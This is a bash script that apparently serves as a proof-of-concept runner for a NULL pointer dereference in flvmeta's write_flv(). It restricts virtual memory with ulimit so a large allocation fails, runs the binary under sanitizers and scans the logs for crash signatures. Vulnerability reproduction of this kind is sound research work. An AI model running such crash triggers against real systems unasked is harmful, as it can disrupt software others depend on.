#!/bin/bash
# vuln_001_run.sh - PoC runner for VULN 001 (CWE-476 NULL Pointer Dereference)
# write_flv() in update.c:103-208
#
# Trigger: malloc(biggest_tag_body_size + FLV_TAG_SIZE) returns NULL when
#          memory is constrained, then fread(NULL,...) causes NULL deref.
#
# This script tries ulimit -v to restrict virtual memory so that the ~16MB
# malloc in write_flv() fails. NOTE: ASAN builds require ~15TB of virtual
# address space for shadow memory reservation, so ulimit -v is incompatible
# with ASAN-instrumented binaries (ASAN fails to initialize at low limits,
# and the 16MB malloc always succeeds at high limits).
# Status will be UNVERIFIED if malloc does not fail in the test environment.

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/flvmeta/src_flv_c"
BINARY="/data/ylwang/non-textfuzz/target/flvmeta/build_test/src/flvmeta"
FLV_FILE="$POC_DIR/vuln_001.flv"
RESULT_FILE="$POC_DIR/vuln_001_result.txt"

cd "$POC_DIR"

# Generate FLV file if not present
if [ ! -f vuln_001.flv ]; then
    python3 "$POC_DIR/vuln_001_gen.py"
fi

# Initialize result file
> "$RESULT_FILE"

echo "=== VULN 001 PoC: CWE-476 NULL Pointer Dereference in write_flv() ===" >> "$RESULT_FILE"
echo "Binary: $BINARY" >> "$RESULT_FILE"
echo "FLV: $FLV_FILE" >> "$RESULT_FILE"
echo "FLV size: $(stat -c%s "$FLV_FILE") bytes" >> "$RESULT_FILE"
echo "" >> "$RESULT_FILE"

# Check if binary uses ASAN
if strings "$BINARY" 2>/dev/null | grep -q "AddressSanitizer"; then
    echo "[*] Binary is ASAN-instrumented" >> "$RESULT_FILE"
    echo "[*] Note: ASAN requires ~15TB virtual address space for shadow memory" >> "$RESULT_FILE"
    echo "[*] ulimit -v conflicts with ASAN: low limits kill ASAN init, high limits allow 16MB malloc" >> "$RESULT_FILE"
else
    echo "[*] Binary: no ASAN detected" >> "$RESULT_FILE"
fi
echo "" >> "$RESULT_FILE"

# --- Test 1: Run without ulimit (baseline - malloc likely succeeds) ---
echo "--- Test 1: No ulimit (baseline, malloc expected to succeed) ---" >> "$RESULT_FILE"
(
    ASAN_OPTIONS="abort_on_error=0:allocator_may_return_null=1:log_path=$POC_DIR/asan_001.log" \
    UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0" \
        "$BINARY" -U "$FLV_FILE" /dev/null 2>&1
    echo "Exit code: $?"
) >> "$RESULT_FILE" 2>&1 || true
echo "" >> "$RESULT_FILE"

# --- Test 2: Try ulimit -v to restrict memory ---
echo "--- Test 2: ulimit -v attempts to trigger malloc failure ---" >> "$RESULT_FILE"

# Try memory limits that might cause 16MB malloc to fail
# For ASAN builds: ASAN itself needs ~500MB+ to even start,
# so only very large limits (17GB+) allow ASAN to start,
# at which point 16MB malloc always succeeds.
# For non-ASAN builds: smaller limits work.
for MEM_LIMIT in 80000 60000 50000 40000 30000 20000; do
    echo "" >> "$RESULT_FILE"
    echo "[*] Trying ulimit -v $MEM_LIMIT KB (~$(( MEM_LIMIT / 1024 )) MB)..." >> "$RESULT_FILE"
    (
        ulimit -v $MEM_LIMIT 2>/dev/null
        ASAN_OPTIONS="abort_on_error=0:allocator_may_return_null=1:log_path=$POC_DIR/asan_001_ulimit_${MEM_LIMIT}.log" \
        UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0" \
            "$BINARY" -U "$FLV_FILE" /dev/null 2>&1
        echo "Exit code: $?"
    ) >> "$RESULT_FILE" 2>&1 || echo "[!] Subshell failed" >> "$RESULT_FILE"
done
echo "" >> "$RESULT_FILE"

# --- Collect ASAN logs ---
echo "--- ASAN/UBSAN log scan ---" >> "$RESULT_FILE"
for f in "$POC_DIR"/asan_001*.log.*; do
    if [ -f "$f" ]; then
        echo "[*] Log file: $f" >> "$RESULT_FILE"
        grep -E "AddressSanitizer|ERROR:|runtime error:|SEGV|null.*dereference|null pointer|fread" "$f" \
            >> "$RESULT_FILE" 2>/dev/null || true
    fi
done
echo "" >> "$RESULT_FILE"

# --- Check for crash signals ---
echo "--- Signal / crash summary ---" >> "$RESULT_FILE"
grep -E "SEGV|Segmentation|Aborted|signal 11|SIGSEGV|null.*dereference|null pointer dereference" \
    "$RESULT_FILE" || echo "[*] No crash signals detected" >> "$RESULT_FILE"

echo "" >> "$RESULT_FILE"
echo "=== Done ===" >> "$RESULT_FILE"
